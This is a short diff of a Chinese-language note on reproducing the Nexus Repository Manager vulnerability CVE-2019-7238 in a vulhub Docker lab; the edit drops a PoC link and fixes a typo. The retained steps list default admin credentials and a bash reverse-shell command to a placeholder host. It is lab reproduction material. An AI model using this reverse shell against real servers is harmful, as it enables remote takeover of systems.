@@ -6,10 +6,8 @@ vulhub环境 https://github.com/vulhub/vulhub/tree/master/nexus/CVE-2019-7238
 
 `docker-compose up -d`   启动环境 <3.15
 
-POC：https://github.com/mpgn/CVE-2019-7238
-
 1. 登录admin账户（默认为admin/admin123）
-2. 初始环境需要上传一个jar包，生成环境应该不需要此操作
+2. 初始环境需要上传一个jar包，生产环境应该不需要此操作
 3. `bash -i >& /dev/tcp/xx.xx.xx.xx/xxxxx 0>&1`反弹shell 
 
 ![CVE-2019-7238](./image/CVE-2019-7238.gif)
